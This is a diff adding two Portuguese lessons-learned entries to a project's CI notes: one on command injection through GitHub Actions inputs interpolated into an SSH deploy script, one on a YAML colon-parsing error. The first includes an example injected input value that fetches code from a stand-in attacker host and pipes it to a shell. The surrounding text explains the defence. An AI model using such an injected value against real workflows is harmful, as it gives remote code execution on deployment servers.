@@ -1074,6 +1074,42 @@ um executável de verdade no Windows é `git update-index --chmod=+x <arquivo>`
 **Origem:** despacho ci/lane-traducoes (23/08/2026), ao ler `mergear.py` para
 escrever a nota exigida pela especificação.
 
+### 5.12 `${{ inputs.* }}` dentro do `script:` da ssh-action é injeção de comando na VPS
+
+**Sintoma:** nenhum — e é esse o problema. O workflow roda, o deploy funciona, e
+um input de texto livre como `motivo='urgente"; curl atacante | sh; #'` executa
+na VPS com o usuário `deploy`.
+**Causa:** o `script:` da `appleboy/ssh-action` é uma STRING, e `${{ }}` é
+substituição de TEXTO feita pelo GitHub **antes** de o shell existir. O valor não
+chega como argumento; chega como código-fonte. Vale para todo `run:` também.
+**Solução:** o que for texto livre entra por `env:` e é lido como `"$VAR"` — aí o
+shell recebe dado, não código. O que precisa mesmo ser interpolado tem de ser
+provado antes por um portão em Python (em `ci/rollback.py`: célula ∈ manifesto,
+alvo = `main` ou 40 hex ancestral da `main`) — é para isso que a validação roda
+num job separado, ANTES do job que tem a chave SSH. Teste-guarda que impede a
+regressão: `test_motivo_e_texto_livre_e_nunca_entra_no_script_do_ssh`, em
+`ci/tests/test_rollback.py`, lê o YAML e reprova se `inputs.motivo` reaparecer
+dentro de um `script:`.
+**Origem:** despacho infra/rollback-pelo-pipeline (23/08/2026), na revisão do
+próprio workflow antes de abrir o PR.
+
+### 5.13 `run: algo: coisa` sem aspas é `ScannerError: mapping values are not allowed here`
+
+**Sintoma:** `yaml.scanner.ScannerError: mapping values are not allowed here`
+apontando para uma linha de `run:` perfeitamente válida como shell — no caso,
+`run: printf 'MOTIVO: %s
+' "$MOTIVO"`. O GitHub recusa o workflow inteiro.
+**Causa:** `: ` (dois-pontos + espaço) dentro de um escalar YAML **sem aspas**
+abre um mapeamento. O comando estava certo; o YAML é que leu `run: printf 'MOTIVO`
+como chave e o resto como valor.
+**Solução:** escalar de bloco sempre — `run: |` na linha, comando embaixo. Custa
+uma linha e imuniza contra `:`, `#` e `{}` no meio do comando.
+**Como isto foi pego ANTES de chegar ao GitHub:** o teste de FORMA do workflow
+(`yaml.safe_load` do arquivo real, em `ci/tests/test_rollback.py`) reprovou na
+máquina. Todo workflow novo merece um: o YAML só é validado pelo GitHub depois do
+merge, e workflow inválido é workflow que simplesmente não existe — sem alarme.
+**Origem:** despacho infra/rollback-pelo-pipeline (23/08/2026).
+
 ## §6 — Testes
 
 ### 6.1 Evidência vermelho→verde sem criar branch descartável
